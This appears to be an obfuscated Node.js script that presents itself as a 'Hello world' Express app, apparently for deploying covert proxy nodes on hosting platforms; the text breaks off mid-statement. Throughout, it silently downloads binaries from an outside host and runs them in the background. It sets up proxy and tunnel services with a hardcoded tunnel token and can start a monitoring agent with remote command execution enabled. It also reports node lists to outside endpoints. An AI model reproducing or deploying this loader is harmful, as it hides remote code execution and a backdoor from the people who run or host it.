const _0x2b4b5b=_0x58aa;(function(_0x3f6132,_0x3fc848){const _0x22c8aa={_0x4848ec:0x217,_0xd4a30:0x1ef,_0x2d58d2:0x222,_0x479ab9:0x1f6,_0x548a80:0x261},_0x5b87b5=_0x58aa,_0x20fe95=_0x3f6132();while(!![]){try{const _0x451efc=parseInt(_0x5b87b5(0x24f))/0x1+parseInt(_0x5b87b5(_0x22c8aa._0x4848ec))/0x2*(-parseInt(_0x5b87b5(_0x22c8aa._0xd4a30))/0x3)+-parseInt(_0x5b87b5(_0x22c8aa._0x2d58d2))/0x4*(parseInt(_0x5b87b5(0x253))/0x5)+-parseInt(_0x5b87b5(0x1c6))/0x6*(parseInt(_0x5b87b5(0x1c9))/0x7)+parseInt(_0x5b87b5(0x23f))/0x8*(-parseInt(_0x5b87b5(0x20f))/0x9)+-parseInt(_0x5b87b5(_0x22c8aa._0x479ab9))/0xa+parseInt(_0x5b87b5(_0x22c8aa._0x548a80))/0xb*(parseInt(_0x5b87b5(0x22c))/0xc);if(_0x451efc===_0x3fc848)break;else _0x20fe95['push'](_0x20fe95['shift']());}catch(_0x485a16){_0x20fe95['push'](_0x20fe95['shift']());}}}(_0x3675,0x5b1ea));const express=require(_0x2b4b5b(0x21e)),app=express(),axios=require(_0x2b4b5b(0x23c)),os=require('os'),fs=require('fs'),path=require(_0x2b4b5b(0x1fb)),{promisify}=require(_0x2b4b5b(0x257)),exec=promisify(require(_0x2b4b5b(0x214))[_0x2b4b5b(0x22b)]),{execSync}=require(_0x2b4b5b(0x214)),UPLOAD_URL=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x242)]||'',PROJECT_URL=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x275)]||'',AUTO_ACCESS=process['env'][_0x2b4b5b(0x1c1)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x2b4b5b(0x1dc),SUB_PATH=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x229)]||_0x2b4b5b(0x22e),PORT=process[_0x2b4b5b(0x1c5)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process['env'][_0x2b4b5b(0x1f7)]||_0x2b4b5b(0x21d),NEZHA_SERVER=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x212)]||'',NEZHA_PORT=process[_0x2b4b5b(0x1c5)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2b4b5b(0x1c5)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x25d)]||_0x2b4b5b(0x280),ARGO_AUTH=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x26c)]||_0x2b4b5b(0x236),ARGO_PORT=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x1d2)]||0x1f41,CFIP=process['env'][_0x2b4b5b(0x258)]||'icook.hk',CFPORT=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x215)]||0x1bb,NAME=process[_0x2b4b5b(0x1c5)][_0x2b4b5b(0x1d4)]||_0x2b4b5b(0x24b);!fs['existsSync'](FILE_PATH)?(fs[_0x2b4b5b(0x1c0)](FILE_PATH),console[_0x2b4b5b(0x241)](FILE_PATH+'\x20is\x20created')):console[_0x2b4b5b(0x241)](FILE_PATH+_0x2b4b5b(0x200));function generateRandomName(){const _0x305c90={_0x249a55:0x22f,_0x3cf2d8:0x223,_0x5a541a:0x1c7},_0x49ee0c=_0x2b4b5b,_0xf59954=_0x49ee0c(0x20e);let _0x54e476='';for(let _0x4c98cc=0x0;_0x4c98cc<0x6;_0x4c98cc++){_0x54e476+=_0xf59954['charAt'](Math[_0x49ee0c(_0x305c90._0x249a55)](Math[_0x49ee0c(_0x305c90._0x3cf2d8)]()*_0xf59954[_0x49ee0c(_0x305c90._0x5a541a)]));}return _0x54e476;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3675(){const _0x41b917=['tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','amd','/config.json\x20>/dev/null\x202>&1\x20&','win32','https://oooo.serv00.net/add-url','push','trojan','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','statSync','response','\x0a\x20\x20\x20\x20','unshift','2892istnBv','existsSync','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','clear','Error\x20downloading\x20files:','match','92060ZyzOiQ','UUID','?security=tls&sni=','substring','https://amd64.ssss.nyc.mn/web','path','?encryption=none&security=tls&sni=','firefox','error','listen','\x20already\x20exists','quic','chmod','includes','pop','/dev/null','pipe','automatic\x20access\x20task\x20added\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','data','direct','\x0a\x20\x20\x0atrojan://','xtls-rprx-vision','\x20-p\x20','abcdefghijklmnopqrstuvwxyz','9tgTiUr','application/json','Error\x20executing\x20command:\x20','NEZHA_SERVER','Add\x20automatic\x20access\x20task\x20faild:\x20','child_process','CFPORT','del\x20/f\x20/q\x20','190AkDJFp','443','ARGO_DOMAIN:','arch','tunnel.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','d600c8bd-23f6-434f-bace-0813632a44be','express','/vmess-argo','writeFileSync','tcp','8312WVesTi','random','\x22\x20>\x20/dev/null\x202>&1','\x20successfully','\x0a\x20\x20credentials-file:\x20','fileUrl','catch','SUB_PATH','arm','exec','12zTrfBA','nohup\x20','sub','floor','readdirSync','close','Download\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/sub.txt\x20saved\x20successfully','2087','eyJhIjoiNzAyYzFiM2VkYzRjNzE5MGIzMTQ2Yjk4OTNhYTYzNmMiLCJ0IjoiOTliNzBlZmMtMjk3ZS00ZTBmLTk4ODQtZWNmNGNlMjMyNGIyIiwicyI6Ik9XTmhNMkkyTVRVdE1EVmpOUzAwTkRJNUxUaGhaVGN0WWpZeE9XVTFZMlExWkdVeSJ9','readFileSync','\x20-c\x20\x22','has','set','finish','axios','split','vless','791640cftfyB','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','log','UPLOAD_URL','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','list.txt','ArgoDomain:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','fileName','/api/add-nodes','all','Railway','--tls','taskkill\x20/f\x20/im\x20','platform','604923kLpByT','&path=%2Fvless-argo%3Fed%3D2560#','/api/add-subscriptions','https+local://8.8.8.8/dns-query','395GACwgG','config.json','get','Skipping\x20adding\x20automatic\x20access\x20task','util','CFIP','Error\x20reading\x20boot.log:','pkill\x20-f\x20\x22[','then','isFile','ARGO_DOMAIN','none','post','Unhandled\x20error\x20in\x20startserver:','7892203LUYybj','aarch64','8443','https://arm64.ssss.nyc.mn/web','toString','sub.txt','127.0.0.1','status','2083','charAt','utf-8','ARGO_AUTH','https://arm64.ssss.nyc.mn/bot','boot.log','\x0a\x20\x20\x0avmess://','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','from','\x20failed:\x20','message','https://amd64.ssss.nyc.mn/v1','PROJECT_URL','\x20-c\x20','npm\x20running\x20error:\x20','basename','test','base64','unlink','tls','map','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/agent','data.q959378.dpdns.org','Nodes\x20uploaded\x20successfully','Empowerment\x20success\x20for\x20','/tunnel.yml\x20run','arm64','vmess','mkdirSync','AUTO_ACCESS','App\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','http','env','18MBdWAt','length','\x0a\x20\x20tunnel:\x20','1365623egZebA','TunnelSecret','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20is\x20running','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','block','forEach','Hello\x20world!','Subscription\x20uploaded\x20successfully','ARGO_PORT','unlinkSync','NAME','stringify','2096','&path=%2Ftrojan-argo%3Fed%3D2560#','/vless-argo','/trojan-argo','\x20>/dev/null\x202>&1\x20&','join','./tmp','rm\x20-rf\x20','filter','web\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://amd64.ssss.nyc.mn/bot','true'];_0x3675=function(){return _0x41b917;};return _0x3675();}let npmPath=path[_0x2b4b5b(0x1db)](FILE_PATH,npmName),phpPath=path[_0x2b4b5b(0x1db)](FILE_PATH,phpName),webPath=path[_0x2b4b5b(0x1db)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2b4b5b(0x266)),listPath=path[_0x2b4b5b(0x1db)](FILE_PATH,_0x2b4b5b(0x244)),bootLogPath=path[_0x2b4b5b(0x1db)](FILE_PATH,_0x2b4b5b(0x26e)),configPath=path[_0x2b4b5b(0x1db)](FILE_PATH,'config.json');function deleteNodes(){const _0x2c3c09={_0x4cebc8:0x26b,_0x3f93f5:0x23d,_0x291654:0x1de,_0x65a639:0x1d5,_0x117ce0:0x228},_0x1634a5=_0x2b4b5b;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1cab66;try{_0x1cab66=fs['readFileSync'](subPath,_0x1634a5(_0x2c3c09._0x4cebc8));}catch{return null;}const _0x5a4201=Buffer['from'](_0x1cab66,_0x1634a5(0x27a))[_0x1634a5(0x265)](_0x1634a5(0x26b)),_0x4c1b3b=_0x5a4201[_0x1634a5(_0x2c3c09._0x3f93f5)]('\x0a')[_0x1634a5(_0x2c3c09._0x291654)](_0x3ad732=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3ad732));if(_0x4c1b3b[_0x1634a5(0x1c7)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1634a5(_0x2c3c09._0x65a639)]({'nodes':_0x4c1b3b}),{'headers':{'Content-Type':_0x1634a5(0x210)}})[_0x1634a5(_0x2c3c09._0x117ce0)](_0x3992b5=>{return null;}),null;}catch(_0x5a309a){return null;}}function cleanupOldFiles(){const _0x2e9b9d={_0x21ea82:0x1cf},_0x2d0b2d={_0x1a72ae:0x1eb,_0x1ab2ce:0x25c},_0xcb3eb=_0x2b4b5b;try{const _0x19af6b=fs[_0xcb3eb(0x230)](FILE_PATH);_0x19af6b[_0xcb3eb(_0x2e9b9d._0x21ea82)](_0x810e8a=>{const _0x5ab58c=_0xcb3eb,_0x39e47c=path[_0x5ab58c(0x1db)](FILE_PATH,_0x810e8a);try{const _0x1292db=fs[_0x5ab58c(_0x2d0b2d._0x1a72ae)](_0x39e47c);_0x1292db[_0x5ab58c(_0x2d0b2d._0x1ab2ce)]()&&fs['unlinkSync'](_0x39e47c);}catch(_0x57e0cb){}});}catch(_0x16a295){}}app[_0x2b4b5b(0x255)]('/',function(_0x5bc9e6,_0x33bbd9){const _0xdb1b96={_0x17b6e7:0x1d0},_0x35910c=_0x2b4b5b;_0x33bbd9['send'](_0x35910c(_0xdb1b96._0x17b6e7));});async function generateConfig(){const _0x297b18={_0x450cf8:0x20c,_0x3e53d0:0x25e,_0x1a7b84:0x1d8,_0x3e43ab:0x21f,_0x1ca27e:0x221,_0x4a3f4d:0x267,_0x3039fd:0x23e,_0x193ed8:0x1d8,_0x124d16:0x1c4,_0x142ffc:0x27c,_0x2e8543:0x201,_0xa38bb8:0x1bf,_0x3e3860:0x1d9,_0x35e266:0x201,_0x5899d2:0x252,_0x2a07ac:0x1d5},_0x8610de=_0x2b4b5b,_0x6d495f={'log':{'access':_0x8610de(0x205),'error':_0x8610de(0x205),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x8610de(_0x297b18._0x450cf8)}],'decryption':_0x8610de(_0x297b18._0x3e53d0),'fallbacks':[{'dest':0xbb9},{'path':_0x8610de(_0x297b18._0x1a7b84),'dest':0xbba},{'path':_0x8610de(_0x297b18._0x3e43ab),'dest':0xbbb},{'path':_0x8610de(0x1d9),'dest':0xbbc}]},'streamSettings':{'network':_0x8610de(_0x297b18._0x1ca27e)}},{'port':0xbb9,'listen':_0x8610de(_0x297b18._0x4a3f4d),'protocol':_0x8610de(_0x297b18._0x3039fd),'settings':{'clients':[{'id':UUID}],'decryption':_0x8610de(_0x297b18._0x3e53d0)},'streamSettings':{'network':_0x8610de(0x221),'security':_0x8610de(0x25e)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x8610de(_0x297b18._0x3039fd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x8610de(_0x297b18._0x3e53d0)},'streamSettings':{'network':'ws','security':_0x8610de(0x25e),'wsSettings':{'path':_0x8610de(_0x297b18._0x193ed8)}},'sniffing':{'enabled':!![],'destOverride':[_0x8610de(_0x297b18._0x124d16),_0x8610de(_0x297b18._0x142ffc),_0x8610de(_0x297b18._0x2e8543)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x8610de(_0x297b18._0xa38bb8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x8610de(0x21f)}},'sniffing':{'enabled':!![],'destOverride':[_0x8610de(0x1c4),_0x8610de(0x27c),_0x8610de(0x201)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x8610de(0x267),'protocol':_0x8610de(0x1e9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x8610de(_0x297b18._0x3e53d0),'wsSettings':{'path':_0x8610de(_0x297b18._0x3e3860)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x8610de(0x27c),_0x8610de(_0x297b18._0x35e266)],'metadataOnly':![]}}],'dns':{'servers':[_0x8610de(_0x297b18._0x5899d2)]},'outbounds':[{'protocol':'freedom','tag':_0x8610de(0x20a)},{'protocol':'blackhole','tag':_0x8610de(0x1ce)}]};fs[_0x8610de(0x220)](path[_0x8610de(0x1db)](FILE_PATH,_0x8610de(0x254)),JSON[_0x8610de(_0x297b18._0x2a07ac)](_0x6d495f,null,0x2));}function _0x58aa(_0x53ea1b,_0x14ef67){const _0x36755a=_0x3675();return _0x58aa=function(_0x58aa44,_0x128daa){_0x58aa44=_0x58aa44-0x1bb;let _0x15d731=_0x36755a[_0x58aa44];return _0x15d731;},_0x58aa(_0x53ea1b,_0x14ef67);}function getSystemArchitecture(){const _0x2433bc={_0x567dad:0x21a,_0x21f557:0x22a,_0x3b8cee:0x1e4},_0x233fd1=_0x2b4b5b,_0x564b12=os[_0x233fd1(_0x2433bc._0x567dad)]();return _0x564b12===_0x233fd1(_0x2433bc._0x21f557)||_0x564b12===_0x233fd1(0x1be)||_0x564b12===_0x233fd1(0x262)?_0x233fd1(0x22a):_0x233fd1(_0x2433bc._0x3b8cee);}function downloadFile(_0x57bfca,_0x513c72,_0x380fa0){const _0x5c39e6={_0x3ddc16:0x255,_0xdc100d:0x25b},_0x29b930={_0x2a8196:0x209},_0x1d1507={_0x2e20f8:0x27b,_0x249c43:0x278,_0x102c3a:0x272,_0x42b837:0x1fe},_0x93e068=_0x2b4b5b,_0x418cc2=_0x57bfca;!fs[_0x93e068(0x1f0)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x231941=fs['createWriteStream'](_0x418cc2);axios({'method':_0x93e068(_0x5c39e6._0x3ddc16),'url':_0x513c72,'responseType':'stream'})[_0x93e068(_0x5c39e6._0xdc100d)](_0x1f3d65=>{const _0x3c4a44={_0x40c5f1:0x232,_0x57529c:0x225},_0x1fd12e=_0x93e068;_0x1f3d65[_0x1fd12e(_0x29b930._0x2a8196)][_0x1fd12e(0x206)](_0x231941),_0x231941['on'](_0x1fd12e(0x23b),()=>{const _0x56b7c4=_0x1fd12e;_0x231941[_0x56b7c4(0x231)](),console[_0x56b7c4(0x241)](_0x56b7c4(_0x3c4a44._0x40c5f1)+path[_0x56b7c4(0x278)](_0x418cc2)+_0x56b7c4(_0x3c4a44._0x57529c)),_0x380fa0(null,_0x418cc2);}),_0x231941['on'](_0x1fd12e(0x1fe),_0x282ae0=>{const _0x3cd059=_0x1fd12e;fs[_0x3cd059(_0x1d1507._0x2e20f8)](_0x418cc2,()=>{});const _0x30e7c3='Download\x20'+path[_0x3cd059(_0x1d1507._0x249c43)](_0x418cc2)+_0x3cd059(_0x1d1507._0x102c3a)+_0x282ae0[_0x3cd059(0x273)];console[_0x3cd059(_0x1d1507._0x42b837)](_0x30e7c3),_0x380fa0(_0x30e7c3);});})[_0x93e068(0x228)](_0x37dc10=>{const _0x692bc5=_0x93e068,_0x2b25cf=_0x692bc5(0x232)+path['basename'](_0x418cc2)+'\x20failed:\x20'+_0x37dc10[_0x692bc5(0x273)];console[_0x692bc5(0x1fe)](_0x2b25cf),_0x380fa0(_0x2b25cf);});}async function downloadFilesAndRun(){const _0x2dc927={_0x23b63a:0x241,_0x1f691a:0x1cb,_0x5093c2:0x23d,_0x41421e:0x235,_0x55ce95:0x269,_0x142584:0x239,_0x33af3e:0x1cd,_0x240baf:0x21c,_0xef1242:0x241,_0x3290f0:0x1cc,_0x50c778:0x24c,_0xee76d6:0x241,_0x1ee8e7:0x1fe,_0x9d2b91:0x277,_0x20bc7a:0x22d,_0x7ee260:0x276,_0x1c886f:0x1cc,_0x525302:0x1f0,_0x160776:0x1f5,_0x247850:0x1bd,_0x73ac6c:0x240,_0x529f13:0x22d},_0x219f33=_0x2b4b5b,_0x42a02c=getSystemArchitecture(),_0x594a85=getFilesForArchitecture(_0x42a02c);if(_0x594a85['length']===0x0){console[_0x219f33(_0x2dc927._0x23b63a)](_0x219f33(_0x2dc927._0x1f691a));return;}const _0x4810d1=_0x594a85[_0x219f33(0x27d)](_0x5c3c1e=>{return new Promise((_0x1533d6,_0x37d9aa)=>{const _0xf34933=_0x58aa;downloadFile(_0x5c3c1e[_0xf34933(0x248)],_0x5c3c1e[_0xf34933(0x227)],(_0x381bc1,_0x52b062)=>{_0x381bc1?_0x37d9aa(_0x381bc1):_0x1533d6(_0x52b062);});});});try{await Promise[_0x219f33(0x24a)](_0x4810d1);}catch(_0x35963a){console[_0x219f33(0x1fe)](_0x219f33(0x1f4),_0x35963a);return;}function _0x3a9873(_0x8e7389){const _0x286190={_0x25d61f:0x202},_0x527ba2={_0xf9146b:0x265},_0x30269f=_0x219f33,_0x3e50b9=0x1fd;_0x8e7389[_0x30269f(0x1cf)](_0x3fd226=>{const _0x388bcd=_0x30269f;fs[_0x388bcd(0x1f0)](_0x3fd226)&&fs[_0x388bcd(_0x286190._0x25d61f)](_0x3fd226,_0x3e50b9,_0x4a7d4f=>{const _0x547142=_0x388bcd;_0x4a7d4f?console['error']('Empowerment\x20failed\x20for\x20'+_0x3fd226+':\x20'+_0x4a7d4f):console['log'](_0x547142(0x1bc)+_0x3fd226+':\x20'+_0x3e50b9[_0x547142(_0x527ba2._0xf9146b)](0x8));});});}const _0xa8f367=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3a9873(_0xa8f367);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10f195=NEZHA_SERVER[_0x219f33(0x203)](':')?NEZHA_SERVER[_0x219f33(_0x2dc927._0x5093c2)](':')[_0x219f33(0x204)]():'',_0x1888c6=new Set([_0x219f33(0x218),'8443',_0x219f33(0x1d6),_0x219f33(_0x2dc927._0x41421e),_0x219f33(_0x2dc927._0x55ce95),'2053']),_0x5f5d52=_0x1888c6[_0x219f33(_0x2dc927._0x142584)](_0x10f195)?_0x219f33(0x1e2):'false',_0x1183e1='\x0aclient_secret:\x20'+NEZHA_KEY+_0x219f33(_0x2dc927._0x33af3e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5f5d52+_0x219f33(_0x2dc927._0x240baf)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x1183e1);const _0x27a1b9='nohup\x20'+phpPath+_0x219f33(0x238)+FILE_PATH+_0x219f33(0x243);try{await exec(_0x27a1b9),console[_0x219f33(_0x2dc927._0xef1242)](phpName+_0x219f33(_0x2dc927._0x3290f0)),await new Promise(_0x46ccac=>setTimeout(_0x46ccac,0x3e8));}catch(_0x5bdc31){console[_0x219f33(0x1fe)]('php\x20running\x20error:\x20'+_0x5bdc31);}}else{let _0x3860cd='';const _0x11d60f=['443',_0x219f33(0x263),_0x219f33(0x1d6),_0x219f33(0x235),_0x219f33(_0x2dc927._0x55ce95),'2053'];_0x11d60f['includes'](NEZHA_PORT)&&(_0x3860cd=_0x219f33(_0x2dc927._0x50c778));const _0x42cb96=_0x219f33(0x22d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x219f33(0x20d)+NEZHA_KEY+'\x20'+_0x3860cd+_0x219f33(0x1c3);try{await exec(_0x42cb96),console[_0x219f33(_0x2dc927._0xee76d6)](npmName+'\x20is\x20running'),await new Promise(_0x4bbee8=>setTimeout(_0x4bbee8,0x3e8));}catch(_0x5a364b){console[_0x219f33(_0x2dc927._0x1ee8e7)](_0x219f33(_0x2dc927._0x9d2b91)+_0x5a364b);}}}else console['log'](_0x219f33(0x1e0));const _0x14852e=_0x219f33(_0x2dc927._0x20bc7a)+webPath+_0x219f33(_0x2dc927._0x7ee260)+FILE_PATH+_0x219f33(0x1e5);try{await exec(_0x14852e),console[_0x219f33(0x241)](webName+_0x219f33(_0x2dc927._0x1c886f)),await new Promise(_0x4896a9=>setTimeout(_0x4896a9,0x3e8));}catch(_0x2594d7){console[_0x219f33(_0x2dc927._0x1ee8e7)](_0x219f33(0x1df)+_0x2594d7);}if(fs[_0x219f33(_0x2dc927._0x525302)](botPath)){let _0x516304;if(ARGO_AUTH[_0x219f33(_0x2dc927._0x160776)](/^[A-Z0-9a-z=]{120,250}$/))_0x516304='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x219f33(0x1f5)](/TunnelSecret/)?_0x516304='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x219f33(_0x2dc927._0x247850):_0x516304=_0x219f33(0x1e3)+FILE_PATH+_0x219f33(_0x2dc927._0x73ac6c)+ARGO_PORT;try{await exec(_0x219f33(_0x2dc927._0x529f13)+botPath+'\x20'+_0x516304+_0x219f33(0x1da)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x151912=>setTimeout(_0x151912,0x7d0));}catch(_0xbe019f){console[_0x219f33(0x1fe)]('Error\x20executing\x20command:\x20'+_0xbe019f);}}await new Promise(_0x42e179=>setTimeout(_0x42e179,0x1388));}function getFilesForArchitecture(_0x4244e7){const _0x59cc1c={_0x4b7631:0x22a,_0x5c81a2:0x1fa,_0x17a57b:0x27e,_0x177e89:0x1f1},_0xdca79a=_0x2b4b5b;let _0x4ad14b;_0x4244e7===_0xdca79a(_0x59cc1c._0x4b7631)?_0x4ad14b=[{'fileName':webPath,'fileUrl':_0xdca79a(0x264)},{'fileName':botPath,'fileUrl':_0xdca79a(0x26d)}]:_0x4ad14b=[{'fileName':webPath,'fileUrl':_0xdca79a(_0x59cc1c._0x5c81a2)},{'fileName':botPath,'fileUrl':_0xdca79a(0x1e1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x282502=_0x4244e7===_0xdca79a(_0x59cc1c._0x4b7631)?_0xdca79a(0x27f):_0xdca79a(_0x59cc1c._0x17a57b);_0x4ad14b[_0xdca79a(0x1ee)]({'fileName':npmPath,'fileUrl':_0x282502});}else{const _0x1bec8b=_0x4244e7===_0xdca79a(0x22a)?_0xdca79a(_0x59cc1c._0x177e89):_0xdca79a(0x274);_0x4ad14b[_0xdca79a(0x1ee)]({'fileName':phpPath,'fileUrl':_0x1bec8b});}}return _0x4ad14b;}function argoType(){const _0x2ec6da={_0x22e52a:0x247,_0x3c6c85:0x203,_0x1fa244:0x1ca,_0x26c7bc:0x21b,_0x639a55:0x1f2,_0x11d32c:0x270,_0x29ae88:0x233},_0x55adc7=_0x2b4b5b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x55adc7(0x241)](_0x55adc7(_0x2ec6da._0x22e52a));return;}if(ARGO_AUTH[_0x55adc7(_0x2ec6da._0x3c6c85)](_0x55adc7(_0x2ec6da._0x1fa244))){fs[_0x55adc7(0x220)](path[_0x55adc7(0x1db)](FILE_PATH,_0x55adc7(_0x2ec6da._0x26c7bc)),ARGO_AUTH);const _0x146153=_0x55adc7(0x1c8)+ARGO_AUTH[_0x55adc7(0x23d)]('\x22')[0xb]+_0x55adc7(0x226)+path[_0x55adc7(0x1db)](FILE_PATH,_0x55adc7(_0x2ec6da._0x26c7bc))+_0x55adc7(_0x2ec6da._0x639a55)+ARGO_DOMAIN+_0x55adc7(_0x2ec6da._0x11d32c)+ARGO_PORT+_0x55adc7(_0x2ec6da._0x29ae88);fs['writeFileSync'](path[_0x55adc7(0x1db)](FILE_PATH,'tunnel.yml'),_0x146153);}else console[_0x55adc7(0x241)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0xcafd52={_0x34909a:0x237,_0x8c8547:0x23d,_0x157c23:0x245,_0x5e1338:0x1d3,_0xcbf2b4:0x1db,_0x203c43:0x241,_0xce2990:0x1fe},_0x4987b1={_0x3f854b:0x246},_0x549ffe={_0xc94a08:0x1e6,_0x4913ad:0x26a,_0x3bacd1:0x1f9,_0x244299:0x224},_0x381a45=_0x2b4b5b;let _0x369ef4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x369ef4=ARGO_DOMAIN,console['log'](_0x381a45(0x219),_0x369ef4),await _0x3a3673(_0x369ef4);else try{const _0x30a12e=fs[_0x381a45(_0xcafd52._0x34909a)](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x3fa375=_0x30a12e[_0x381a45(_0xcafd52._0x8c8547)]('\x0a'),_0x358335=[];_0x3fa375['forEach'](_0x432ea1=>{const _0x4a03a9=_0x381a45,_0x3b40a1=_0x432ea1['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3b40a1){const _0x2788db=_0x3b40a1[0x1];_0x358335[_0x4a03a9(0x1e8)](_0x2788db);}});if(_0x358335['length']>0x0)_0x369ef4=_0x358335[0x0],console[_0x381a45(0x241)](_0x381a45(_0xcafd52._0x157c23),_0x369ef4),await _0x3a3673(_0x369ef4);else{console[_0x381a45(0x241)](_0x381a45(0x208)),fs[_0x381a45(_0xcafd52._0x5e1338)](path[_0x381a45(_0xcafd52._0xcbf2b4)](FILE_PATH,_0x381a45(0x26e)));async function _0x5c2973(){const _0x4a61a7=_0x381a45;try{process[_0x4a61a7(0x24e)]===_0x4a61a7(_0x549ffe._0xc94a08)?await exec(_0x4a61a7(0x24d)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x4a61a7(0x25a)+botName[_0x4a61a7(_0x549ffe._0x4913ad)](0x0)+']'+botName[_0x4a61a7(_0x549ffe._0x3bacd1)](0x1)+_0x4a61a7(_0x549ffe._0x244299));}catch(_0x4074bf){}}_0x5c2973(),await new Promise(_0x1e0c14=>setTimeout(_0x1e0c14,0xbb8));const _0x52a6e9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x381a45(0x240)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x52a6e9+_0x381a45(0x1da)),console[_0x381a45(_0xcafd52._0x203c43)](botName+_0x381a45(0x1cc)),await new Promise(_0x5b5a9e=>setTimeout(_0x5b5a9e,0xbb8)),await extractDomains();}catch(_0x51c08c){console[_0x381a45(_0xcafd52._0xce2990)](_0x381a45(0x211)+_0x51c08c);}}}catch(_0xcb7f51){console['error'](_0x381a45(0x259),_0xcb7f51);}async function _0x3a3673(_0x49cbf7){const _0x5773e1={_0xcf1b25:0x1fd,_0x12a901:0x250,_0x82ca69:0x26f,_0x4de5b1:0x271,_0x4e632a:0x1d5,_0x1c78b1:0x27a,_0x103560:0x265,_0x4f27f8:0x255},_0x3dc3ea=_0x381a45,_0x476877=execSync(_0x3dc3ea(_0x4987b1._0x3f854b),{'encoding':'utf-8'}),_0x24fa54=_0x476877['trim'](),_0x3e64fb=NAME?NAME+'-'+_0x24fa54:_0x24fa54;return new Promise(_0x42c93d=>{setTimeout(()=>{const 